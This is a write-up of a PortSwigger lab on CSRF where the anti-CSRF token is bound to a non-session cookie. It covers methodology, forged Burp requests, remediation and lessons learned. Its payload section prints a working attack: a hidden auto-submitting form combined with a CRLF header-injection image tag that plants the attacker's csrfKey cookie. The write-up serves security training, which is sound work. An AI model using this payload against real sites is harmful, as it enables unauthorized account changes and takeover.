# LAB 05 - CSRF where token is tied to non-session cookie

## Lab Information

- **Category:** Cross-Site Request Forgery (CSRF)
- **Type:** CSRF Token
- **Difficulty:** PRACTITIONER
- **Status:** ✅ Solved
- **Date:** 2026-9-14

---

![Cross-Site Request Forgery](https://img.shields.io/badge/Cross_Site_Request_Forgery-CSRF-red)

![Solved](https://img.shields.io/badge/Status-Solved-success)

---

# Table of Contents

- Executive Summary
- Lab Information
- Objective
- Vulnerability Overview
- Attack Prerequisites
- Environment & Scope
- Methodology
- Discovery Process
- Technical Analysis
- Payload Analysis
- Exploitation Flow
- Evidence
- Impact
- Root Cause
- Risk Assessment
- Remediation
- Lessons Learned
- References
- Screenshots

---

# Executive Summary

A Cross-Site Request Forgery (CSRF) vulnerability was discovered in the email change function. Although the application requires a valid CSRF token linked to a `CSRFKey`, these tokens are not bound to the authenticated user's session; consequently, an attacker can obtain valid CSRF and `CSRFKey` tokens from their own session and use them in a forged request targeting another authenticated user's session.

This allows an attacker to craft an HTML form (executed cross-site) to change the email address of a logged-in victim, without needing to know or obtain the victim's specific CSRF and `CSRFKey` tokens.

---

# Objective

The objective of this lab is to demonstrate that an attacker can cause a state-changing request to be submitted from an external origin while the victim is authenticated to the target application.

---

# Vulnerability Overview

A Cross-Site Request Forgery (CSRF) vulnerability occurs when an attacker tricks the browser of a logged in victim into sending a request to another website, causing that site to execute the request using the victim's privileges.
Authentication establishes who the user is, but it does not necessarily prove that the user intentionally initiated a particular request.

---


# Attack Requirements

1. The victim must be authenticated to the target application.
2. The victim's browser must be able to send requests to the target application while authenticated.
3. The attacker must know the vulnerable endpoint and required parameters.
4. The state-changing action must be triggerable through a cross-site request.
5. The attacker must be able to obtain a valid CSRF token from their own session.
6. The attacker must be able to obtain a valid CSRFKey token from their own session.

---

# Environment & Scope

| Item | Value |
|------|-------|
| Target | PortSwigger Web Security Academy lab |
| Endpoint | `/my-account/change-email` |
| HTTP Method | POST , GET |
| Parameter | `email` |
| Authentication | Session cookie |
| CSRF Protection | CSRF Token |
| Attack Platform | Exploit Server |
| Client | Web Browser |
| Attack Vector | Cross-site HTML form submission |

---

# Methodology

1. Open the vulnerable lab and log in to the application.
2. Change the email address and capture the original request using Burp Suite.
3. Identify the `email`, `csrf`, `session`, and `CSRFKey` values ​​in the request.
4. Log in using a separate user session and obtain new `CSRF` and `CSRFKey` tokens.
5. Replace the `CSRF` and `CSRFKey` tokens in the victim's session request with the new tokens obtained from the other session.
6. Resend the modified request using Burp Repeater.
7. Verify that the request is accepted and the victim's email address has changed.
8. Create a cross-site HTML form containing valid `CSRF` and `CSRFKey` tokens belonging to the attacker.
9. Host the malicious form on the exploit server.
10. Deliver the exploit to the victim and verify the success of the exploit.
    
---

# Discovery Process

### Step 1 — Testing the Update email

```email
mohamad@gmail.com
```

The email address is updated via the `email` parameter, and the browser uses session data to identify the user, with protection enabled using CSRF and CSRFKey tokens.

### Step 2 — Testing the modification of the CSRF parameter by another user

Session A → Victim
Session B → Attacker

Token A → obtained from Session A
Token B → obtained from Session B
CSRFKey A → obtained from Session A


```text
POST /my-account/change-email HTTP/1.1
Cookie: session=SESSION_A csrfkey=CSRFKey_A

email=attacker@example.com&csrf=TOKEN_B
```
SESSION_A = victim's authenticated session
TOKEN_B   = fresh CSRF token obtained from another session
CSRFKey_A = fresh CSRF Key obtained from Victim session

Upon examining the response, we observed that the server returned an error message containing "invalid csrfkey".

### Step 3 — Testing the modification of the CSRF and CSRFKey parameters by another user

Session A → Victim
Session B → Attacker

Token A → obtained from Session A
Token B → obtained from Session B
CSRFKey B → obtained from Session B


```text
POST /my-account/change-email HTTP/1.1
Cookie: session=SESSION_A csrfkey=CSRFKey_B

email=attacker@example.com&csrf=TOKEN_B
```
SESSION_A = victim's authenticated session
TOKEN_B   = fresh CSRF token obtained from another session
CSRFKey_A = fresh CSRF Key obtained from another session

Upon inspecting the response, we observed that the server successfully performed a redirect without requiring the CSRF and CSRFKey tokens to be bound to the user's session. After accessing the account page, we confirmed that the email address had been changed; this demonstrates that the application accepts state-changing requests even when using CSRF and CSRFKey tokens belonging to another user.

---

## Security Control Verification

| Session Used | CSRF Token Source | CSRF Key Source | Result |
|---|---|---|---|
| Victim | Victim session | Victim session | ✅ Email changed |
| Victim | Attacker session | Victim session | ❌ Invalid CSRF Key |
| Victim | Attacker session | Attacker session | ✅ Email changed |

The final test reveals the security vulnerability: the request does not require linking the parameters to the specific user session (CSRF and CSRFKey).

---

# Technical Analysis

The vulnerable functionality uses the following endpoint:

```http
POST /my-account/change-email
csrfkey= XXXXXX

email= mohamad@gmail.com & csrf= XXXXXX
```
The relevant request parameter is: email=mohamad@gmail.com
The request is authenticated using the victim's session cookie.

The application validates the provided CSRF and CSRFKey tokens but does not verify that these tokens are associated with the authenticated user's session.

As a result, valid CSRF and CSRFKey tokens obtained from another session can be sent in conjunction with the victim's session cookie, and the server will accept them.

The server accepts the request because the provided CSRF and CSRFKey tokens are valid, but it fails to verify that the two tokens belong to the authenticated session associated with that request.

```http
POST /my-account/change-email HTTP/1.1
csrfkey= For another person

email=attacker@gmail.com & csrf= For another person
```

---

# Payload Analysis

## Payload Used

```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="new-email@example.com">
    <input type="hidden" name="csrf" value="ATTACKER_CSRF">
</form>

<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=ATTACKER_CSRFKEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
```

## Why This Payload Works

```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">

```
It creates a form that sends a POST request to the entered page.


```html
 <input type="hidden" name="email" value="attacker@example.com">
```
You enter the email address value you want to change, without it being visible to the victim.

```html
     <input type="hidden" name="csrf" value="TOKEN_ATTACKER">
```
The `csrf` value must be a valid, fresh token obtained from the attacker's authenticated session. The token is intentionally not obtained from the victim's session.
The form must include a CSRF parameter because it is required; however, it is not bound to the victim's session meaning a valid, fresh CSRF token obtained from another session can be used. This is intentional, as the vulnerability allows the server to process the state-changing request provided a valid CSRF parameter from *anyone* is present.

```html
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=ATTACKER_CSRFKEY%3b%20SameSite=None" onerror="document.forms[0].submit()">

```
It causes the victim's browser to send a GET request to the target site, triggering a CRLF injection that sets `csrfKey=ATTACKER_CSRFKEY` in the victim's browser; the `onerror` event was used because we wanted to submit the form after modifying the `csrfKey`.


---

# Exploitation Flow

```text
        Attacker
           │
           │ Sends a malicious HTML page
           ▼
    Victim's Browser
           │
           │ POST /my-account/change-email
           │ email=attacker@example.com&csrf=XXXXXXXX 
           │  csrfkey= XXXXXXXX
           │ 
           ▼
      Target Server
           │
           ▼
The attacker obtains new CSRF and CSRFKey tokens.
           │
           ▼
   Malicious HTML form
           │
           ▼
    The <img> element
           │
           ▼
   Victim's browser
           │
           ▼
       POST with:
     Victim Session
    Attacker's CSRF token
    Attacker-controlled email
     and GET with:
   Attacker's CSRF Key
           │
           ▼
The server verifies the validity of the two tokens
           │
           ▼
Fails to verify session binding
           │
           ▼
   Request accepted
           │
           ▼
 Victim's email changed
           │
           ▼
      Email changed
          ✅
  
```

---

# Impact

Depending on the privileges of the victim and the application's functionality, successful CSRF exploitation may allow an attacker to:

- Change the victim's email address.
- Modify account profile information.
- Perform unauthorized account actions.
- Change security-related settings if they are vulnerable to CSRF.
- Perform administrative actions when the victim has administrative privileges.
- Trigger financial or transactional operations if those endpoints lack CSRF protection.
  
### Lab-Specific Impact

In this lab, successful exploitation allows an attacker to change the authenticated victim's email address without the victim intentionally submitting the request.

Depending on the application's account recovery and security mechanisms, unauthorized email modification may potentially contribute to account takeover.

---

# Root Cause

The root cause of the problem lies in the failure to correctly bind the CSRF token and the CSRFKey; while the application verifies the association between the two tokens, it does not bind them to the authenticated user's session.

Consequently, valid tokens obtained from a different session can be submitted within the victim's authenticated session and accepted by the server. The server thus treats the request as originating from the victim, relying on CSRF and CSRFKey tokens that were not originally issued for that specific session.

For example:

```http
POST /my-account/change-email
csrfkey= XXXXXX

email=attacker@gmail.com & csrf=XXXXXXX
```
The server receives the request and changes the authenticated user's email address.

This occurs due to inconsistent implementation of security measures.

---

# Risk Assessment

| Item | Value |
|------|-------|
| Severity |  Medium |
| CVSS Score | Not calculated |
| CWE | CWE-352: Cross-Site Request Forgery (CSRF) |
| OWASP Category | Cross-Site Request Forgery (CSRF) |
| Exploitability | Demonstrated in lab |
| Business Impact | Unauthorized account/email modification; potential account takeover depending on account recovery functionality |

---

# Remediation

- **Using Anti-CSRF Tokens**
  - Generate a cryptographically secure CSRF token and bind it server-side to the authenticated user session.
  - Reject the request if the token is missing, invalid, expired, already used, or associated with a different session.
  - Do not accept a valid token merely because it exists in a global or shared token pool.
  - Include this token in operations that alter data state (such as POST, PUT, and DELETE requests).
  - The server verifies that the token received from the browser matches the stored token before executing the request.

- **SameSite Cookies**
  - Configure session cookies with an appropriate `SameSite` policy such as `Lax` or `Strict` where compatible with the application's requirements.
  - SameSite should be considered an additional layer of defense rather than the sole CSRF protection mechanism.
    
- **Request for re-authentication for sensitive actions**
  - Requiring the user to enter their current password, a two-factor authentication (2FA/OTP) code, or solve a CAPTCHA before completing critical      actions (such as changing their email address, transferring funds, or deleting their account).

- **Strict adherence to REST standards (Strict HTTP Methods)**
  - Ensure that GET requests are used solely for viewing and reading data, and never alter the system state (changing a password via a GET link is     a security disaster).

- **Custom Request Headers**
  - For AJAX/API requests, require an appropriate custom header where applicable and validate it server-side.
  - Do not rely on custom headers as the sole CSRF defense.
 
  - **Checking Origin and Referer Headers**
  - Verifying the Origin or Referer header on the server side as an additional validation step to ensure that the request actually originated from     your site rather than a malicious one.
    
---

# Lessons Learned

- Browsers may automatically attach authentication cookies to requests, subject to cookie policies such as SameSite.
- Predictability and ease of exploitation.
- Risks associated with state-changing HTTP requests.
- Simulating the attack via independent interfaces.
- Authentication is not equivalent to intent verification.
- CSRF exploits the victim's authenticated session rather than stealing the session itself.
- A state-changing request should require an appropriate CSRF defense.
- The presence of a CSRF token must be mandatory for state-changing requests, and its value must be validated server-side.
- A CSRF token must be both valid and correctly bound to the authenticated user's session.
- The CSRFKey token must be valid and correctly associated with the authenticated user's session.
  
---

# References

- PortSwigger Web Security Academy — Cross-site request forgery (CSRF)
- OWASP — Cross-Site Request Forgery Prevention Cheat Sheet
- MITRE CWE-352 — Cross-Site Request Forgery (CSRF)
- FIRST — CVSS Specification

---

# Screenshots

## Test

![Test](Screen-Shots/test-lab5.png)

...

## Burp Request

![Test](Screen-Shots/burp-request-lab5.png)

...

## Payload

![Test](Screen-Shots/payload-lab5.png)

...


## Successful 

![Success](Screen-Shots/success-lab5.png)

---

# Conclusion

This practical experiment demonstrated the existence of a Cross-Site Request Forgery (CSRF) vulnerability in the email change function. Although the application required valid `CSRF` and `CSRFKey` tokens, it failed to bind these tokens to the authenticated user's session.

By obtaining valid `CSRF` and `CSRFKey` tokens from a different session, the attacker was able to craft a forged CSRF POST request that combined the victim's authenticated session context with the attacker's own CSRF token. The server accepted the request and updated the victim's email address.

The key takeaway here is that protection against CSRF attacks requires more than merely verifying the validity of the tokens; the tokens must also be correctly bound to the authenticated session within which the request is being processed.
